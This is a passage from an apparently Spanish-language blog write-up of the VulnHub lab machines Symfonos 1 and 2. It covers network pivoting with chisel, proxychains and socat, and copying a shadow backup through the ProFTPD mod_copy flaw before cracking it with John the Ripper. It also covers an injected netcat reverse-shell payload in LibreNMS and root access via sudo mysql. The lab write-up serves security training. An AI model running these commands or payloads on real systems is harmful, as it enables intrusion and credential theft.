+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./chisel client 192.168.1.160:1234 R:socks</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><p><strong>client</strong>: Indicamos que nos queremos conectar como cliente.</p>
+</li>
+<li><p><strong>R:socks</strong>: SOCKS5 permite redirigir el tráfico de <strong>toda máquina alcanzable desde la víctima</strong>.</p>
+</li>
+</ul>
+<p>Una vez nos salga el mensajito de session detectada, podríamos utilizar <strong>proxychains</strong>(&#x2F;etc&#x2F;proxychains.conf) y añadir abajo de todo la conexión(si se cierra alguna conexión el túnel se cierra):</p>
+<p>Con proxychain podemos <strong>enrutar</strong> el tráfico de los programas que ejecutemos en nuestro equipo a través del proxy creado, así es cómo si estuvieramos en la máquina víctima.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/proxychains_symfonos1.png"
+                      class="" title="Añadiendo el proxy sock5 a proxychain"
+                >
+
+<p>Si probamos a testear si el puerto 80 de la máquina que “no vemos” está abierto con nmap:</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/primer_nmap_proxychains_erroneo.png"
+                      class="" title="Primer nmap después de añadir proxychain."
+                >
+
+<p>¿Pero porque no va, si hemos añadido el proxy?</p>
+<p>Vamos a realizar tres cambios:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains nmap -p80 --open -T5 -v -n 192.168.100.5 -sT -Pn</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><p><strong>proxychains</strong>: Añadimos proxychains para indicar por donde va a ir la información(en este caso por el proxy que le hemos indicado en el archivo de configuración).</p>
+</li>
+<li><p><strong>-sT</strong>: Utiliza el formato tradicional del three-handshake, es más lento y menos sigiloso, pero funciona bien a través de proxies. Utiliza directamente la pila del SO(incluye protocolos cómo TCP, UDP…)</p>
+</li>
+<li><p><strong>-Pn</strong>: No queremos que nos descubra host a través del protocolo ARP.</p>
+</li>
+</ul>
+<p><strong>Importante</strong>. Si tenemos otra línea de proxy y no funciona, recomiendo comentarla(en mi caso tenía la de tor). Si quires quitar los mensajes que salen por consola de proxychains puedes utilizar el parámetro <strong>-q</strong> de quiet.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/primer_nmap_con_proxychains.png"
+                      class="" title="Realizamos el primer nmap con proxychains."
+                >
+
+<p>Y vualá, podemos apreciar que el comando ha funciona.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/excalidraw_pivoting_con_tunel.png"
+                      class=""
+                >
+
+<h1 id="Reconocimiento-Symfonos2"><a href="#Reconocimiento-Symfonos2" class="headerlink" title="Reconocimiento Symfonos2"></a>Reconocimiento Symfonos2</h1><h2 id="Escaneo-de-puertos-1"><a href="#Escaneo-de-puertos-1" class="headerlink" title="Escaneo de puertos"></a>Escaneo de puertos</h2><p>Genial, una vez entendido como podemos ejecutar comandos a través de un túnel, vamos a escanear los puertos de la máquina Symfonos 2:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">roxychains -q nmap --top-ports 500 --open -T5 -v -n 192.168.100.5 -sT -Pn -oG allPorts | grep -vE <span class="string">&quot;Discover&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>–top-ports 500</strong>: Solo escaneamos los 500 puertos más importantes ya que el escaneo mediante el parámetro -sT es más lento.</li>
+<li><strong>grep -vE “Discover”</strong>:Con la v mostramos los resultados que no coinciden con lo buscado, con -E podemos utilizar expresiones regulares, ej: quieres excluir varias líneas con diferentes palabras “Discover|Open”.</li>
+</ul>
+<p>Recordar que tenemos la utilidad <strong>extractPorts</strong> ya mencionada en el primer escaneo. El siguiente paso es enumerar la versión y servicio que corresponde con cada puerto, para eso podemos utilizar unos scripts de reconocimiento de nmap</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains -q nmap -sT -Pn -sCV -p21,22,80,139,445 192.168.100.5 -oN targeted</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>-sT</strong>: Seguramente tengamos que arrastrar este parámetro en más de un comando, nmap por defecto usa <strong>SYN Scan(-sS)</strong> si el usuario no tiene permisos manda paquetes raw, TCP connection Scan(-sT) más fácil de detectar y más lento. Yo lo indico para saber en cada momento que estamos haciendo.</li>
+</ul>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/targeted_symfonos2.png"
+                      class="" title="Targeted symfonos 2"
+                >
+
+<h2 id="Exploracion-desde-el-navegador"><a href="#Exploracion-desde-el-navegador" class="headerlink" title="Exploración desde el navegador"></a>Exploración desde el navegador</h2><p>¿Cómo podemos abrir esto desde el navegador?<br>Nosotros ponemos 192.168.100.5 en la URL y no nos carga el recurso, claramente es porque no tenemos acceso, desde la terminal utilizabamos proxychain, aquí en lugar de lanzar firefox con proxychains podemos descargarnos la extensión&#x2F;addon <strong>Foxyproxy</strong> y añadir una entrada como la siguiente:</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/foxyproxy_entrada_symfonos2.png"
+                      class=""
+                >
+
+<p>No os olvideis darle a guardar!.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/foxyproxy_conexion_con_symfonos2.png"
+                      class="" title="Nos conectamos al proxy creado con FoxyProxy."
+                >
+
+<p>Antes de ir por la web, vamos a ver que encontramos con smb, ya que el puerto 139 y 445 están abiertos.</p>
+<h2 id="Enumeracion-smb"><a href="#Enumeracion-smb" class="headerlink" title="Enumeración smb"></a>Enumeración smb</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains -q smbclient -L //192.168.100.5 -N</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/first_view_smbclient.png"
+                      class="" title="Primer vistazo con smblclient."
+                >
+
+<p>Probamos a meternos a anonymous y descargarnos los archivos que existan.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/smb_download_log_file_symfonos2.png"
+                      class="" title="Accedemos y nos descargamos los archivos."
+                >
+
+
+<p>Si miramos este archivo totalemte realista, podemos encontrar varias cosas extrañas como el <strong>backup del &#x2F;etc&#x2F;shadow</strong> en &#x2F;var&#x2F;backups&#x2F;shadow.bak, pero si bajamos un poco podemos encontrar el usuario <strong>aelous</strong> que esta compartiendo mediante smb el siguiente directorio &#x2F;home&#x2F;aeolus&#x2F;share(en smb el directorio de anonymous).</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/mirando_el_archivo_log_smb_symfonos2.png"
+                      class="" title="Usuario aeolus encontrado en log.txt"
+                >
+
+<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>Volvemos al archivo targeted y vemos que el puerto 21 es un servicio ftp y la versión es <strong>ProFTPD 1.3.5</strong>(ProFTPD es un tipo de software para ftp) podemos apreciar que la versión esta algo anticuada(si buscas en internet te saldrá la última, 1.3.9).</p>
+<p>Y si hacemos una rápida busqueda con <strong>searchsploit</strong>:</p>
+<p>Lo suyo es ir probando uno por uno, pero para facilitar las cosas, el único que nos va a servir de ayuda es el último:</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/searchsploit_proftpd_symfonos2.png"
+                      class="" title="Buscamos con searchsploit proftpd 1.3.5"
+                >
+
+<p>Vamos a inspeccionarlos con <strong>searchsploit -x linux&#x2F;remote&#x2F;36742.txt</strong></p>
+<p>Esta vulnerabilidad nos permite(sin estar autenticados) <strong>copiar un recurso de origen</strong>(site cpfr &#x2F;etc&#x2F;passwd) <strong>a un recurso de destino</strong>(site cpto &#x2F;tmp&#x2F;passwd.copy).</p>
+<p>Entramos al servidor ftp</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains -q ftp 192.168.100.5</span><br></pre></td></tr></table></figure></div>
+
+<p>Y este nos pedirá unas credenciales, puedes probar <strong>las que quieras</strong>, verás que no tendrás acceso, a continuación, te saldrá un <strong>530</strong>, pero, si utilizamos el comando <strong>help</strong> podemos apreciar que el comando <strong>site</strong> está disponible.</p>
+<p>A partir de aquí nos debemos de hacer dos preguntas:</p>
+<ol>
+<li>¿Qué copiamos de origen?</li>
+<li>¿Y a dónde lo copiamos de destino?</li>
+</ol>
+<p>Recordar que antes hemos visto una ruta donde se almacena una copia de seguridad del archivo shadow(&#x2F;var&#x2F;backups&#x2F;shadow.bak), vamos a copiar dicho archivo:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">site cpfr /var/backups/shadow.bak</span><br></pre></td></tr></table></figure></div>
+
+<p>En el archivo log.txt también hemos visto que la carpeta compartida por SMB a la que hemos accedido antes(anonymous) estaba en la siguiente ruta del sistema: “&#x2F;home&#x2F;aeolus&#x2F;share”, así que vamos a copiar el archivo ahí:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">site cpto /home/aeolus/share/shadow.bak</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/move_shadow_ftp_to_smb_symfonos2.png"
+                      class="" title="Movemos el archivo shadow de ftp al directorio de smb."
+                >
+
+<p>Accedemos al recurso compartido y nos descargamos el archivo:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains -q smbclient //192.168.100.5/anonymous -N</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/download_shadow_attacker_machine_symfonos2.png"
+                      class="" title="Descargarmos el archivo shadow.bak."
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/contenido_del_shadow_symfonos2.png"
+                      class="" title="Visualizamos el contenido del shadow."
+                >
+
+<h2 id="John-the-ripper-para-crackear-shadow"><a href="#John-the-ripper-para-crackear-shadow" class="headerlink" title="John the ripper para crackear shadow"></a>John the ripper para crackear shadow</h2><p>Con la herramienta John the ripper podemos intentar crackear los hashes existentes en este archivo.</p>
+<p>Un truco, si tienes el comando <strong>locate</strong> y no te acuerda donde tienes un archivo es una ruta muy larga, puedes utilizar lo siguiente para agilizar el proceso.</p>
+<p>Si utilizas una zsh puedes ejecutar comandos que esten contenidos en $(), para ello te vas al paréntesis de cierre y dándole al tabulador se ejecuta el comando y se cambie por el output, ej:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">john -w:$(locate rockyou.txt) 192.168.100.5 shadow.bak</span><br></pre></td></tr></table></figure></div>
+
+<p>En mi caso tengo el archivo en la siguiente ruta:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">john -w:/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt shadow.bak</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>🏆 Premio!. Podemos ver que nos encuentra la contraseña de auelus: sergioteamo Premio!. Podemos ver que nos encuentra la contraseña de aeolus: sergioteamo, ya podéis cortar john the ripper en este caso.</p>
+<h2 id="Entramos-mediante-ssh"><a href="#Entramos-mediante-ssh" class="headerlink" title="Entramos mediante ssh"></a>Entramos mediante ssh</h2><p>Usuario y contraseña, ¿dónde puedo probar esto?. Tenemos el servidor ssh abierto por el puerto 22, vamos a darle un intento:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains -q ssh aeolus@192.168.100.5</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/conexion_ssh_establecida_con_aeolus_symfonos2.png"
+                      class="" title="Establecemos conexión por ssh a la máquina symfonos2"
+                >
+
+
+<h2 id="Explotacion-servicio-web-oculto"><a href="#Explotacion-servicio-web-oculto" class="headerlink" title="Explotación servicio web oculto."></a>Explotación servicio web oculto.</h2><p>Para poder hacer el ctrl+L:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure></div>
+<p>Comprobamos la versión del sistema operativo:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/lsb_release_symfonos2.png"
+                      class="" title="lsb_release -a en la máquina Symfonos 2."
+                >
+
+<p>Intentamos listar los permisos de sudo para este usuario:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure></div>
+
+<p>Nos pide contraseña, introducimos sergioteamo, pero apreciamos que dicho usuario no puede utilizar sudo.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/sudo_l_symfonos2.png"
+                      class="" title="Uso del comando sudo -l."
+                >
+
+
+<p>Mostramos los procesos que se están ejecutando en el sistema:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ps -faux</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li><strong>f</strong>: Forest. Muestra los procesos en un formato árbol.</li>
+<li><strong>a</strong>: All. Incluye todos los procesos aunque no sean de este usuario.</li>
+<li><strong>u</strong>: User. Información legible para los humanos y más información cómo usuario propieatrio del proceso, comando ejecutado, uso de CPU…</li>
+<li><strong>x</strong>: Procesos no vinculados a ninguna terminal, procesos en segundo plano.</li>
+</ul>
+<p>De un vistazo rápido nada.</p>
+<p>Podemos ver los puertos abiertos:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># No existe en la máquina</span></span><br><span class="line">netstat -nat</span><br><span class="line"></span><br><span class="line">ss -nltp</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>ss</strong>: Sockets Staticks. Para mostrar conexiones sobre conexiones de red.</li>
+<li><strong>-n</strong>: Muestra las direcciones ip y elimina la resolución DNS.</li>
+<li><strong>l</strong>: Muestra solo los socket en estado listening(los que estan a la espera de conexiones entrantes)</li>
+<li><strong>t</strong>: Filtra por las conexiones TCP.</li>
+<li><strong>-p</strong>: Información sobre los procesos asociados a cada socket, ej: nombre, PID.</li>
+</ul>
+<p>Podemos apreciar diferentes puertos que no veiamos desde fuera, esto se debe a las diferentes configuraciones de firewall, algunos puertos nuevos por ejemplo serían el 3306, 8080</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/ver_puertos_internos_symfonos2.png"
+                      class="" title="Puertos internos abiertos."
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/excalidraw_puertos_internos.png"
+                      class=""
+                >
+
+<p>¿Cómo podemos utilizar dicho puerto?</p>
+<h2 id="Acceso-a-servicios-internos-mediante-ssh-tunneling"><a href="#Acceso-a-servicios-internos-mediante-ssh-tunneling" class="headerlink" title="Acceso a servicios internos mediante ssh tunneling."></a>Acceso a servicios internos mediante ssh tunneling.</h2><p>Para ello podemos utilizar ssh para crear un túnel(redirección de puertos).</p>
+<p>Antes, podemos checkear que el puerto no tenga ningun servicio corriendo con el comando <strong>lsof -i:8080</strong>.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains -q ssh aeolus@192.168.100.5 -L 8080:127.0.0.1:8080</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>- -L</strong>: Local Port Forwarding. Esto nos permite que un servicio remoto este accesible localmente, también tienes -R, pero es para remote port forwarding, llevar el servicio de un puerto de la máquina donde estás a la que te conectas.</p>
+<p>Recuerda que estas utilizando proxychains y todo el tráfico en realidad va desde Symfonos1.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/puerto_8080_symfonos2.png"
+                      class="" title="Resultado del Local Port Forwarding."
+                >
+
+<p>Genial, vemos este panel de login de LibreNMS, programa utilizado para la monitorización de red del sistema y recordamos que tenemos contraseñas, aeolus:sergioteamo y podemos probar si se reutilizan estas:</p>
+<p>En la siguiente imagen se puede apreciar un error que suele salir por introducir mal las credenciales:</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/error_libre_nms_al_entrar_symfonos2.png"
+                      class="" title="Error al entrar a libre_nms"
+                >
+
+<p>La reutilización de contraseñas es válida y podemos acceder al panel:</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/entrada_valida_libre_nms_symfonos2.png"
+                      class="" title="Visualización del portal."
+                >
+
+<h2 id="RCE-en-servicio-web-interno"><a href="#RCE-en-servicio-web-interno" class="headerlink" title="RCE en servicio web interno"></a>RCE en servicio web interno</h2><p>Vamos a buscar al tuntun con searchsploit y vamos a inspeccionar(searchsploit -x php&#x2F;webapps&#x2F;47044.py) el siguente script en Python para entender como funciona y poder realizarlo nosotros de una manera más manual.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/searchsploit_libre_nms_symfonos2.png"
+                      class="" title="Searchsploit para librenms"
+                >
+
+<p>Al inspeccionar el script podemos ver que el payload es una reverse shell(de monkey pentester en versiones antiguas de netcat)</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/searchsploit_libre_nms_payload_field_symfonos2.png"
+                      class="" title="Campo payload en el script."
+                >
+
+<p>Si buscamos por payload en el script, podemos apreciar que existe una función que se llama create_new_device a la que le pasa una url y en la petición, en el campo community le inyecta el payload.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/searchsploit_libre_nms_create_new_device_payload_injection_symfonos2.png"
+                      class="" title="Donde inyecta el payload."
+                >
+
+<p>Al final le añade a la url &#x2F;addhost&#x2F;</p>
+<p>Para crear un nuevo dispositivo en la web seguimos el siguiente orden Devices &gt; Add Device y una vez aquí solo tenemos que tener cuidado de dos campos:</p>
+<ul>
+<li>community: Que es donde se va a realiza la inyección de la reverse shell.</li>
+<li>Force add: en la función create_new_device en el script en python indica que está en ON(activado&#x2F;marcado)</li>
+</ul>
+<p>En la máquina Symfonos 2 nos pondremos en escucha por el puerto 4646:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nlvp 4646</span><br></pre></td></tr></table></figure></div>
+
+<p>Indicamos que la <strong>ip de la reverse shell es la de la máquina SYMFONOS2</strong>, porque vamos a probar que funciona, más adelante indicaremos que es la de SYMFONOS1.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.100.5 4646 &gt;/tmp/f) #</span></span><br></pre></td></tr></table></figure></div>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/executing_reverse_shell_hidden_web_service_symfonos2.png"
+                      class="" title="Creando el dispositivo en la web."
+                >
+
+<p>Pero aún no hemos ganado acceso, ¿porque?. Si seguimos mirando el script en python vemos que abajo hay otra función llamada request_exploit</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/python_script_def_request_exploit_symfonos2.png"
+                      class="" title="Función que llama al exploit."
+                >
+
+<p>En esta función podéis ver que utiliza el id “capture”, capture está en Devices &gt; All Devices &gt; Generic &gt; reverse_shell &gt; Settings(icono de engranaje) &gt; Capture</p>
+<p>En la pestaña de SNMP si le das a run llama a &#x2F;ajax_output.php y está es la manera que han tenido de automatizarlo. Si tu le das a run debería llegarte la conexión.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/run_snmp_device_symfonos2.png"
+                      class="" title="Botón de ejecutar SNMP."
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/primer_acceso_a_cronus_exitoso_symfonos2.png"
+                      class="" title="Acceso a cronus."
+                >
+
+<h2 id="Uso-de-Socat-para-reverse-shell"><a href="#Uso-de-Socat-para-reverse-shell" class="headerlink" title="Uso de Socat para reverse shell"></a>Uso de Socat para reverse shell</h2><p>Socat establece <strong>conexiones bidireccionales</strong> entre dos puntos de comunicación, podemos usar esto a nuestro favor.</p>
+<ol>
+<li>La IP de la reverse shell es la de Symfonos 1.</li>
+</ol>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/reverse_shell_add_device_symfonos1_symfonos2.png"
+                      class="" title="Envío de reverse shell a Symfonos 1."
+                >
+
+<ol start="2">
+<li>Redirigimos el tráfico con socat(todo lo que entre por el puerto 4646 que se mande al puerto 4646 de la máquina atacante).</li>
+</ol>
+<p>Antes de esto debemos tener una conexión activa para poder realizar todo el proceso, vamos a establecer la conexión con Symfonos1, mediante el curl que hicimos al principio que nos enviaba una reverse shell a nuestro equipo atacante. Vamos a cambiarnos a root(recordar que podemos ejecutar bash -p).<br>Comprobamos que socat esta instalado(which socat) si no recuerda que puedes subirle un binario sin problema)</p>
+<p>Redirigimos el tráfico:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:4646,fork TCP:192.168.1.160:4646</span><br></pre></td></tr></table></figure></div>
+
+<p>Dejamos esto abierto para que no se cierre el túnel.</p>
+<ol start="3">
+<li>Nos ponemos en escucha desde la máquina atacante:<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nlvp 4646</span><br></pre></td></tr></table></figure></div></li>
+<li>En la web nos vamos al dispositivo creado y ejecutamos el exploit(nos vamos a SNMP y le damos a run)</li>
+</ol>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/conexion_establecida_cronus_maquina_atacante.png"
+                      class="" title="Obtenemos la reverse shell en nuestra máquina atacante."
+                >
+
+<p>GENIAL!. Ya hemos conseguido traernos la reverse shell donde está el usuario cronus a nuestro máquina atacante, a continuación se realizaría el <strong>tratamiento de la tty</strong> como hemos visto en los pasos anteriores.</p>
+<p>Si intentas hacer un Remote Port Forwarding con Chisel no podrás porque Chisel no permite la bidireccionalidad, esto significa que no enviaría el tráfico a la máquina atacante y al intentar conectarte de esta al puerto te dirá que ya está ocupado.</p>
+<h1 id="Root-Symfonos-2"><a href="#Root-Symfonos-2" class="headerlink" title="Root Symfonos 2"></a>Root Symfonos 2</h1><p>Si usamos el comando:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure></div>
+<p>Podemos apreciar que el usuario cronus puede ejecutar como root mysql:</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/cronus_sudo_l_mysql_symfonos2.png"
+                      class="" title="Permite ejecutar el comando mysql como root."
+                >
+
+<p>Si buscamos en <a class="link"   href="https://gtfobins.github.io/" >gtfobins<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> por mysql podemos ver que puede usar sudo para escalar privilegios, si pinchamos en él, nos sale lo siguiente:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> mysql -e <span class="string">&#x27;\! /bin/sh&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/12/04/Symfonos%201%20y%202/acceso_ganado_root_symfonos2.png"
+                      class="" title="Nos convertimos en root."
+                >
+
+<h1 id="Referencias"><a href="#Referencias" class="headerlink" title="Referencias"></a>Referencias</h1><ul>
+<li><a class="link"   href="https://www.youtube.com/watch?v=L1jSoCcvRY4&t=6529s" >Pivoting desde cero #1 | S4vitar<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>eJPT</tag>
+        <tag>vulnhub</tag>
+        <tag>medium</tag>
+        <tag>linux</tag>
+        <tag>pivoting</tag>
+        <tag>eCPPTv2</tag>
+        <tag>eCPTXv2</tag>
+      </tags>
+  </entry>
+</search>
